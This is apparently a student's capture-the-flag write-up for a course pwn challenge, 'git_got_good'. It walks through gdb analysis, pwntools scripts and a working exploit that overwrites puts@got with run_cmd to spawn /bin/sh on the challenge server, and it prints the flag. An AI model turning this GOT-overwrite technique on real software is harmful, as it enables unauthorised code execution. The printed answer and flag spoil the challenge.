Location`nc offsec-chalbroker.osiris.cyber.nyu.edu 1341`
Flag: `flag{y0u_sur3_GOT_it_g00d!}`
Yes, it is spelled "Git it GOT it, Good"
Lore: `Yu Gi Oh`

###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./git_got_good 
Welcome! The time is Wed Feb 28 04:28:11 PM EST 2024
That is, it's time to d-d-d-d-d-d-d-duel
Anyways, give me a string to save: Hello
Ok, I'm writing Hello
 to my buffer...
Hello
```

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  undefined8 data;
  undefined8 x;
  undefined8 *bfr;
  long ck;
  
  ck = *(long *)(in_FS_OFFSET + 0x28);
  bfr = &buf;
  init(param_1);
  printf("Welcome! The time is ");
  run_cmd("/bin/date");
  puts("That is, it\'s time to d-d-d-d-d-d-d-duel");
  printf("Anyways, give me a string to save: ");
  fgets((char *)&data,0x18,stdin);
  printf("Ok, I\'m writing %s to my buffer...\n",&data);
  *bfr = data;
  bfr[1] = x;
  puts((char *)&data);
  if (ck != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

So right away, I notice that call to run_cmd:
I wonder if we can push a string of `/bin/sh` or something into the correct register and then call it with a rip overwrite or a stack overwrite
```
        004007a3 bf ce 08        MOV        EDI,s_/bin/date_004008ce   = "/bin/date"
                 40 00
        004007a8 e8 9e ff        CALL       run_cmd               undefined run_cmd()
                 ff ff

```

That being said, this program uses`fgets`, which does not have the same issues as `gets` I think
	Though it has issues of it's own
	The buffer size is included as an argument (24 chars)

25 chars of input does give me a segfault
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 -c "print('A'*25)"
AAAAAAAAAAAAAAAAAAAAAAAAA
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./git_got_good 
Welcome! The time is [Detaching after vfork from child process 593386]
Wed Feb 28 04:39:56 PM EST 2024
That is, it's time to d-d-d-d-d-d-d-duel
Anyways, give me a string to save: AAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x00000000004007de in main ()
(gdb) info registers
rax            0x7fffffffddc0      140737488346560
rbx            0x7fffffffdef8      140737488346872
rcx            0x7fffffffddc0      140737488346560
rdx            0x17                23
rsi            0x6022a1            6300321
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffdde0      0x7fffffffdde0
rsp            0x7fffffffddc0      0x7fffffffddc0
r8             0x0                 0
r9             0x410               1040
r10            0x1000              4096
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdf08      140737488346888
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x4007de            0x4007de <main+115>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/20x $sp
0x7fffffffddc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddd0: 0x41414141      0x00414141      0x3c3f4200      0x876a4165
0x7fffffffdde0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
0x7fffffffddf0: 0x00000000      0x00000000      0x0040076b      0x00000000
0x7fffffffde00: 0x00000000      0x00000001      0xffffdef8      0x00007fff
(gdb) c
Continuing.
Ok, I'm writing AAAAAAAAAAAAAAAAAAAAAAA to my buffer...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400800 in main ()
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
=> 0x0000000000400800 <+149>:   mov    %rax,(%rcx)
(gdb) info registers
rax            0x4141414141414141  4702111234474983745
rbx            0x7fffffffdef8      140737488346872
rcx            0x41414141414141    18367622009667905
rdx            0x4141414141414141  4702111234474983745
rsi            0x7fffffffdc10      140737488346128
rdi            0x7fffffffdbe0      140737488346080
rbp            0x7fffffffdde0      0x7fffffffdde0
rsp            0x7fffffffddc0      0x7fffffffddc0
r8             0x73                115
r9             0x1                 1
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffdf08      140737488346888
r14            0x0                 0
r15            0x7ffff7ffd000      140737354125312
rip            0x400800            0x400800 <main+149>
eflags         0x10206             [ PF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/20x $sp
0x7fffffffddc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddd0: 0x41414141      0x00414141      0x3c3f4200      0x876a4165
0x7fffffffdde0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
0x7fffffffddf0: 0x00000000      0x00000000      0x0040076b      0x00000000
0x7fffffffde00: 0x00000000      0x00000001      0xffffdef8      0x00007fff
```

So the A's were all moved into `rdx` `rax` and `rcx` ...which seems intentional
But this was done after the print
Registerse right before call to print


Hmm, I'm also getting segfaults for less amount of data entered than 25 chars

```
Dump of assembler code for function main:
   0x000000000040076b <+0>:     push   %rbp
   0x000000000040076c <+1>:     mov    %rsp,%rbp
=> 0x000000000040076f <+4>:     sub    $0x20,%rsp
   0x0000000000400773 <+8>:     mov    %fs:0x28,%rax
   0x000000000040077c <+17>:    mov    %rax,-0x8(%rbp)
   0x0000000000400780 <+21>:    xor    %eax,%eax
   0x0000000000400782 <+23>:    movq   $0x601080,-0x10(%rbp)
   0x000000000040078a <+31>:    mov    $0x0,%eax
   0x000000000040078f <+36>:    call   0x400726 <init>
   0x0000000000400794 <+41>:    mov    $0x4008b8,%edi
   0x0000000000400799 <+46>:    mov    $0x0,%eax
   0x000000000040079e <+51>:    call   0x4005e0 <printf@plt>
   0x00000000004007a3 <+56>:    mov    $0x4008ce,%edi
   0x00000000004007a8 <+61>:    call   0x40074b <run_cmd>
   0x00000000004007ad <+66>:    mov    $0x4008d8,%edi
   0x00000000004007b2 <+71>:    call   0x4005b0 <puts@plt>
   0x00000000004007b7 <+76>:    mov    $0x400908,%edi
   0x00000000004007bc <+81>:    mov    $0x0,%eax
   0x00000000004007c1 <+86>:    call   0x4005e0 <printf@plt>
   0x00000000004007c6 <+91>:    mov    0x2008a3(%rip),%rdx   # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007cd <+98>:    lea    -0x20(%rbp),%rax
   0x00000000004007d1 <+102>:   mov    $0x18,%esi
   0x00000000004007d6 <+107>:   mov    %rax,%rdi
   0x00000000004007d9 <+110>:   call   0x400600 <fgets@plt>
   0x00000000004007de <+115>:   lea    -0x20(%rbp),%rax
   0x00000000004007e2 <+119>:   mov    %rax,%rsi
   0x00000000004007e5 <+122>:   mov    $0x400930,%edi
   0x00000000004007ea <+127>:   mov    $0x0,%eax
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
   0x0000000000400800 <+149>:   mov    %rax,(%rcx)
   0x0000000000400803 <+152>:   mov    %rdx,0x8(%rcx)
   0x0000000000400807 <+156>:   lea    -0x20(%rbp),%rax
   0x000000000040080b <+160>:   mov    %rax,%rdi
   0x000000000040080e <+163>:   call   0x4005b0 <puts@plt>
   0x0000000000400813 <+168>:   mov    $0x0,%eax
   0x0000000000400818 <+173>:   mov    -0x8(%rbp),%rcx
   0x000000000040081c <+177>:   xor    %fs:0x28,%rcx
   0x0000000000400825 <+186>:   je     0x40082c <main+193>
   0x0000000000400827 <+188>:   call   0x4005c0 <__stack_chk_fail@plt>
   0x000000000040082c <+193>:   leave
   0x000000000040082d <+194>:   ret

```
### How much data can we enter before a segfault
#### How much Data
```python
def findSegfault():
	i = 1
	while True:
		p =  process('/bin/bash')
		p.sendline('gdb ./git_got_good -q')
		p.sendline("r")
		d = p.recvuntil("save:")
		p.sendline(cyclic(i))
		p.recvuntil("to my buffer...\n")
		while True:
			ln = cleanLine(p.recvline())
			#print(ln)
			if re.search(".*Inferior", ln):
				p.recv(timeout=0.05)
				break
			elif re.search(".*SIGSEGV.*", ln):
				print(str(i) + " characters before segfault")
				print(ln)
				print(cleanLine(p.recvline()))
				return 0
		i += 1
```
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GetGOTGood_Pwn1.py
[+] Starting local process '/bin/bash': pid 617175
[+] Starting local process '/bin/bash': pid 617186
[+] Starting local process '/bin/bash': pid 617197
[+] Starting local process '/bin/bash': pid 617208
[+] Starting local process '/bin/bash': pid 617227
[+] Starting local process '/bin/bash': pid 617238
[+] Starting local process '/bin/bash': pid 617249
[+] Starting local process '/bin/bash': pid 617260
[+] Starting local process '/bin/bash': pid 617282
[+] Starting local process '/bin/bash': pid 617293
[+] Starting local process '/bin/bash': pid 617304
[+] Starting local process '/bin/bash': pid 617315
[+] Starting local process '/bin/bash': pid 617334
[+] Starting local process '/bin/bash': pid 617345
[+] Starting local process '/bin/bash': pid 617356
16 characters before segfault
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400800 in main ()

[*] Stopped process '/bin/bash' (pid 617356)
[*] Stopped process '/bin/bash' (pid 617345)
[*] Stopped process '/bin/bash' (pid 617334)
[*] Stopped process '/bin/bash' (pid 617315)
[*] Stopped process '/bin/bash' (pid 617304)
[*] Stopped process '/bin/bash' (pid 617293)
[*] Stopped process '/bin/bash' (pid 617282)
[*] Stopped process '/bin/bash' (pid 617260)
[*] Stopped process '/bin/bash' (pid 617249)
[*] Stopped process '/bin/bash' (pid 617238)
[*] Stopped process '/bin/bash' (pid 617227)
[*] Stopped process '/bin/bash' (pid 617208)
[*] Stopped process '/bin/bash' (pid 617197)
[*] Stopped process '/bin/bash' (pid 617186)
[*] Stopped process '/bin/bash' (pid 617175)
[*] Stopped process '/bin/bash' (pid 617156)
```

#### Finding Offsets
###### Finding offset of registers:
```python
def regOffset():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("r")
	d = p.recvuntil("save:")
	p.sendline(cyclic(25))
	#p.recvuntil("Segmentation fault")
	p.recvuntil("(gdb) ")
	print(p.recv)
	# RAX
	p.sendline("info registers rax")
	ln = cleanLine(p.recv())
	print(ln)
	l = re.split("\s+", ln)
	d = re.split("x", l[1])
	n = 2
	a = d[1]
	byt = [a[i:i+n] for i in range(0, len(a), n)]
	bytes = b"".join(struct.pack("B", int("0x"+byt[i], 16)) for i in range(0,4))
	rax = bytes
	info("rax offset = %d", cyclic_find(rax))
	# RDX
	p.sendline("info registers rdx")
	ln = cleanLine(p.recv())
	print(ln)
	l = re.split("\s+", ln)
	d = re.split("x", l[1])
	n = 2
	a = d[1]
	byt = [a[i:i+n] for i in range(0, len(a), n)]
	bytes = b"".join(struct.pack("B", int("0x"+byt[i], 16)) for i in range(0,4))
	rdx = bytes
	info("rdx offset = %d", cyclic_find(rdx))
	# RCX
	p.sendline("info registers rcx")
	ln = cleanLine(p.recv())
	print(ln)
	l = re.split("\s+", ln)
	d = re.split("x", l[1])
	n = 2
	a = d[1]
	byt = [a[i:i+n] for i in range(0, len(a), n)]
	bytes = b"".join(struct.pack("B", int("0x"+byt[i], 16)) for i in range(0,4))
	rcx = bytes
	info("rcx offset = %d", cyclic_find(rcx))
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GetGOTGood_Pwn1.py
rax            0x6161616261616161  7016996769588404577
(gdb) 
[*] rax offset = 1

rdx            0x6161616461616163  7016996778178339171
(gdb) 
[*] rdx offset = 9

rcx            0x61616661616165    27410165089263973
(gdb) 
[*] rcx offset = 18
```
We get a segfault once `rcx` is overwritten, after 18 characters

But so, the data in RAX (the beginning of the string) is stored at the address in RCX (which we also control)

So we can use this to write data wherever we may want


So yeah, what if we try to get it so that main returns and see what we can call from there

I wonder if I could ultimately use this to overwrite like, the string used in the command
That data command is DYING to be overwritten
```
  s_/bin/date_004008ce                            XREF[1]:     main:004007a3(*)  
        004008ce 2f 62 69        ds         "/bin/date"
                 6e 2f 64 
                 61 74 65 00
```

So looking at these lines
```
0x0000000000400800 <+149>:   mov    %rax,(%rcx)
0x0000000000400803 <+152>:   mov    %rdx,0x8(%rcx)
```

```
00 40 08 ce + 8 = 4008D6
```

So `rax` goes into the first 8 bytes and rdx goes into the last two
I will have to figure out how much of rdx

So, I think the plan is to build a payload
`[Rax] + [RDX] + [RCX]`
I am gonna have to get the sizes right and stuff
`/bin/sh = 2F 62 69 6E 2F 73 68`


Hmm, I built a payload, but I'm still getting a fault:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GetGOTGood_Pwn1.py
[*] Process './git_got_good' stopped with exit code -11 (SIGSEGV) (pid 633639)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.633639'
    Arch:      amd64-64-little
    RIP:       0x400800
    RSP:       0x7ffe42c7d580
    Exe:       '/home/kali/Desktop/5-Week/git_got_good' (0x400000)
    Fault:     0x4008ce
[*] rsp = 0x7ffe42c7d580

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400800 in main ()
(gdb) $ info registers
rax            0x2f62696e2f7368    13337528865092456
rbx            0x7fffffffdef8      140737488346872
rcx            0x4008ce            4196558
rdx            0x0                 0
rsi            0x7fffffffdc10      140737488346128
rdi            0x7fffffffdbe0      140737488346080
rbp            0x7fffffffdde0      0x7fffffffdde0
rsp            0x7fffffffddc0      0x7fffffffddc0
```

So `rcx` has the right value (as do my other registers), but it doesn't seem to want to write the data there

Maybe my rax data is too big
split rax and rdx in 2?


I knew they were up to something when they mentioned running `checksec` in class... there's a fucking canary
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ~/.local/bin/pwn checksec ./git_got_good 
[*] '/home/kali/Desktop/5-Week/git_got_good'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Time to see if I can find it

Does `fgets` set the stack canary?


Can I brute force it?
We know it's formatted `0x00` + one more char and that it will go on the stack at some point.
So we know 16 chars is what gives us a segfault so, something like
`[14 Char of Padding] + [0x00] + [0x00-0xff]` should give us a segfault until we guess a character for the last one that matches the canary

PROBLEM....I think it changes every time you run the program
###### Brute Force Canary Script:
```python
def catchCanary():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	base = cyclic(14)
	for i in range(0,255):
		print("i = ", i)
		#p.sendline("break *0x0000000000400800")
		p.sendline("r")
		d = p.recvuntil("save:")
		pld = base + b"".join([struct.pack("B", 0x00), struct.pack("B", i)])
		p.sendline(pld)
		#p.interactive()
		p.recvuntil("to my buffer...\n")
		while True:
			ln = cleanLine(p.recvline())
			#print(ln)
			if re.search(".*Inferior", ln):
				print("No segfault!")
				print(ln)
				print(i)
				return 0
			elif re.search(".*SIGSEGV.*", ln):
				p.recv(timeout=0.05)
				break
```
First attempt:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GetGOTGood_Pwn1.py
i =  1
i =  2
i =  3
i =  4
i =  5
i =  6
i =  7
i =  8
i =  9
i =  10
No segfault!
```
Actually, that happened every time we ran it.

I know, for some of the remote programs, it spins up a new process of the same instance with every connection, meaning the canary is the same each time but...I'm never sure how that works

I guess I'm gonna try to see if I can fit it in my payload

# Okay, so I think I'm looking at this payload wrong
###### Main
```
Dump of assembler code for function main:
   0x000000000040076b <+0>:     push   %rbp
   0x000000000040076c <+1>:     mov    %rsp,%rbp
=> 0x000000000040076f <+4>:     sub    $0x20,%rsp
   0x0000000000400773 <+8>:     mov    %fs:0x28,%rax
   0x000000000040077c <+17>:    mov    %rax,-0x8(%rbp)
   0x0000000000400780 <+21>:    xor    %eax,%eax
   0x0000000000400782 <+23>:    movq   $0x601080,-0x10(%rbp)
   0x000000000040078a <+31>:    mov    $0x0,%eax
   0x000000000040078f <+36>:    call   0x400726 <init>
   0x0000000000400794 <+41>:    mov    $0x4008b8,%edi
   0x0000000000400799 <+46>:    mov    $0x0,%eax
   0x000000000040079e <+51>:    call   0x4005e0 <printf@plt>
   0x00000000004007a3 <+56>:    mov    $0x4008ce,%edi
   0x00000000004007a8 <+61>:    call   0x40074b <run_cmd>
   0x00000000004007ad <+66>:    mov    $0x4008d8,%edi
   0x00000000004007b2 <+71>:    call   0x4005b0 <puts@plt>
   0x00000000004007b7 <+76>:    mov    $0x400908,%edi
   0x00000000004007bc <+81>:    mov    $0x0,%eax
   0x00000000004007c1 <+86>:    call   0x4005e0 <printf@plt>
   0x00000000004007c6 <+91>:    mov    0x2008a3(%rip),%rdx    # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007cd <+98>:    lea    -0x20(%rbp),%rax
   0x00000000004007d1 <+102>:   mov    $0x18,%esi
   0x00000000004007d6 <+107>:   mov    %rax,%rdi
   0x00000000004007d9 <+110>:   call   0x400600 <fgets@plt>
   0x00000000004007de <+115>:   lea    -0x20(%rbp),%rax
   0x00000000004007e2 <+119>:   mov    %rax,%rsi
   0x00000000004007e5 <+122>:   mov    $0x400930,%edi
   0x00000000004007ea <+127>:   mov    $0x0,%eax
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
   0x0000000000400800 <+149>:   mov    %rax,(%rcx)
   0x0000000000400803 <+152>:   mov    %rdx,0x8(%rcx)
   0x0000000000400807 <+156>:   lea    -0x20(%rbp),%rax
   0x000000000040080b <+160>:   mov    %rax,%rdi
   0x000000000040080e <+163>:   call   0x4005b0 <puts@plt>
   0x0000000000400813 <+168>:   mov    $0x0,%eax
   0x0000000000400818 <+173>:   mov    -0x8(%rbp),%rcx
   0x000000000040081c <+177>:   xor    %fs:0x28,%rcx
   0x0000000000400825 <+186>:   je     0x40082c <main+193>
   0x0000000000400827 <+188>:   call   0x4005c0 <__stack_chk_fail@plt>
   0x000000000040082c <+193>:   leave
   0x000000000040082d <+194>:   ret
```
###### Moves
```
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
   0x0000000000400800 <+149>:   mov    %rax,(%rcx)
   0x0000000000400803 <+152>:   mov    %rdx,0x8(%rcx)
```
##### `0x4007f4`
`mov    -0x10(%rbp),%rcx` 
Moves data from `rbp-8` through `rbp - 16` into `rcx`
##### `0x4007f8`
`mov    -0x20(%rbp),%rax`
Moves data from `rbp-24` through `rbp-32` into `rax`
##### `0x4007fc`
`mov    -0x18(%rbp),%rdx`
Moves data from `rbp-16` through `rbp-24` into `rdx`
##### `0x400800`
`mov    %rax,(%rcx)`
Moves the data stored in `rax` into the **address** that `rcx` points to
	This means the value stored in `rcx` **must** be an address
This is where we tend to get a segfault
##### `0x400803`
`mov    %rdx,0x8(%rcx)`
Moves the data stored in `rdx` into `rcx+8`
	In this case, `rcx` holds an address, and this stores the data at that address + 8

### Now, let's make sure this area is indeed writeable:
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/git_got_good
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/git_got_good
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/git_got_good
```
So we can only write in these lines:
```
0x0000000000601000 - 0x0000000000602000
```

That's outside of the (executable) program code (which is good for them, things that are executable should not be writable)
###### Here's what that writeable memory looks like:
![[Pasted image 20240303185802.png]]
Notice that it does contain those third party library calls.
Can I overwrite one of those calls?

At `0x400800`, where that overwriting happens, the only system call we have left is a `puts`
```
gef➤  disas main
Dump of assembler code for function main:
   ...omitted for brevity...
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    rcx,QWORD PTR [rbp-0x10]
   0x00000000004007f8 <+141>:   mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004007fc <+145>:   mov    rdx,QWORD PTR [rbp-0x18]
=> 0x0000000000400800 <+149>:   mov    QWORD PTR [rcx],rax
   0x0000000000400803 <+152>:   mov    QWORD PTR [rcx+0x8],rdx
   0x0000000000400807 <+156>:   lea    rax,[rbp-0x20]
   0x000000000040080b <+160>:   mov    rdi,rax
   0x000000000040080e <+163>:   call   0x4005b0 <puts@plt>
   ...omitted for brevity...
End of assembler dump.
```
So can I overwrite puts?

With that in mind, how do I build a payload?
```
addr(puts)             addr(run_cmd)            [command text]
                       At rcx+8                 at rcx
RCX                     RDX                      RAX                
[rbp-8] - [rbp-16]      [rbp-16] - [rbp-24]      [rbp-24] - [rbp-32]
```
And that will have to be reversed in the payload, giving us the following
```
[Command Text] [Address of `run_cmd`] [Address of `puts`]

cmd    = "/bin/sh" = 2F 62 69 6E 2F 73 68 = p64(0x68732F6E69622F)
rcAddr = 0x0040074b = p64(0x4B07400000000000) 
pAddr  = 0x00601018 = p64(18106000000000000)
```
Must use `/bin/sh` for my command because `cat flag.txt` would be too long to fit in that space
##### Attempt 1:
###### Code
```python
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x4B07400000000000)
	pAddr  = p64(18106000000000000)
	return cmd + rcAddr + pAddr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("r")
	d = p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Registers
```
Breakpoint 1, 0x0000000000400800 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x68732f6e69622f  
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe268  → "/home/kali/Desktop/5-Week/git_got_good"
$rcx   : 0x40534fa24da000  
$rdx   : 0x4b07400000000000
$rsp   : 0x00007fffffffddc0  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffdde0  →  0x0000000000000001
$rsi   : 0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rdi   : 0x00007fffffffdbe0  →  0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rip   : 0x0000000000400800  →  <main+149> mov QWORD PTR [rcx], rax
```
###### Stack
```
0x00007fffffffddc0│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddc8│+0x0008: 0x4b07400000000000
0x00007fffffffddd0│+0x0010: 0x0040534fa24da000
0x00007fffffffddd8│+0x0018: 0xbd2acba24bd33000
0x00007fffffffdde0│+0x0020: 0x0000000000000001     ← $rbp
```

I'm not sure what happened to my `rcx` but I know my `rdx` is reversed
	Maybe I need to reverse them both? Do addresses not get reversed? or maybe they got un-reversed?
##### Attempt 2:
###### Code
```python
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x000000000040074B)
	pAddr  = p64(0x0000000000601018)
	return cmd + rcAddr + pAddr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("r")
	d = p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Registers
```
$rax   : 0x68732f6e69622f  
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe268  →  "/home/kali/Desktop/5-Week/git_got_good"
$rcx   : 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
$rdx   : 0x000000000040074b  →  <run_cmd+0> push rbp
$rsp   : 0x00007fffffffddc0  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffdde0  →  0x0000000000000001
$rsi   : 0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rdi   : 0x00007fffffffdbe0  →  0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rip   : 0x0000000000400800  →  <main+149> mov QWORD PTR [rcx], rax
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe28f  →  "SHELL=/usr/bin/zsh"
```
###### Stack:
```
0x00007fffffffddc0│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddc8│+0x0008: 0x000000000040074b  →  <run_cmd+0> push rbp
0x00007fffffffddd0│+0x0010: 0x0000000000601018  →  0x00007ffff7e40b00  →  <puts+0> push r14
0x00007fffffffddd8│+0x0018: 0xeb5b5023e48daf00
0x00007fffffffdde0│+0x0020: 0x0000000000000001     ← $rbp
```
Our registers and stack look good I think?
...hmmm, still got a segfault

Okay, subtract 8 from the address we want to overwrite?
	The address stored in `rdx` is saved at `rcx+8`, and THAT is what we want to overwrote `puts`

##### Attempt 3:
###### Code
```python
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x000000000040074B)
	pAddr  = p64(0x0000000000601010)
	return cmd + rcAddr + pAddr
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("r")
	d = p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Registers
```
$rax   : 0x68732f6e69622f  
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe268  →  "/home/kali/Desktop/5-Week/git_got_good"
$rcx   : 0x0000000000601010  →  0x00007ffff7fdd300  →  <_dl_runtime_resolve_xsave+0> push rbx
$rdx   : 0x000000000040074b  →  <run_cmd+0> push rbp
$rsp   : 0x00007fffffffddc0  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffdde0  →  0x0000000000000001
$rsi   : 0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rdi   : 0x00007fffffffdbe0  →  0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rip   : 0x0000000000400800  →  <main+149> mov QWORD PTR [rcx], rax
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe28f  →  "SHELL=/usr/bin/zsh"
```
###### Stack:
```
0x00007fffffffddc0│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddc8│+0x0008: 0x000000000040074b  →  <run_cmd+0> push rbp
0x00007fffffffddd0│+0x0010: 0x0000000000601010  →  0x00007ffff7fdd300  →  <_dl_runtime_resolve_xsave+0> push rbx
0x00007fffffffddd8│+0x0018: 0x635fc6a8b393a100
0x00007fffffffdde0│+0x0020: 0x0000000000000001     ← $rbp
```

Added a breakpoint right before the call to `puts` to see if it's overwritten correctly:
```
gef➤  $ break *0x40080e
Breakpoint 2 at 0x40080e

Breakpoint 2, 0x000000000040080e in main ()
 code:x86:64 ────
     0x400803 <main+152>       mov    QWORD PTR [rcx+0x8], rdx
     0x400807 <main+156>       lea    rax, [rbp-0x20]
     0x40080b <main+160>       mov    rdi, rax
●→   0x40080e <main+163>       call   0x4005b0 <puts@plt>
   ↳    0x4005b0 <puts@plt+0>     jmp    QWORD PTR [rip+0x200a62]    # 0x601018 <puts@got.plt>
gef➤  $ x/2x 0x00601018
0x601018 <puts@got.plt>:    0x0040074b    0x00000000
```
We can see the address of `run_cmd` stored there, yay!

YAY I WIN!
```
gef➤  $ c
Continuing.
[Detaching after vfork from child process 440715]
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week
$  zsh: suspended (signal)  python3 GitGOTGood_Pwn.py
```

### Local:
###### Code:
```python
def localShell():
	p = process("./git_got_good")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Results:
```
└─$ python3 GitGOTGood_Pwn.py
[+] Starting local process './git_got_good': pid 443187
[*] Switching to interactive mode
 Ok, I'm writing /bin/sh to my buffer...
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week
```
### Remote:
###### Code:
```python
def localShell():
	p = process("./git_got_good")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GitGOTGood_Pwn.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1341: Done
[*] Switching to interactive mode
 Ok, I'm writing /bin/sh to my buffer...
$ whoami
pwn
$ ls
flag.txt
git_got_good
$ cat flag.txt
flag{y0u_sur3_GOT_it_g00d!}
$  zsh: suspended (signal)  python3 GitGOTGood_Pwn.py
```

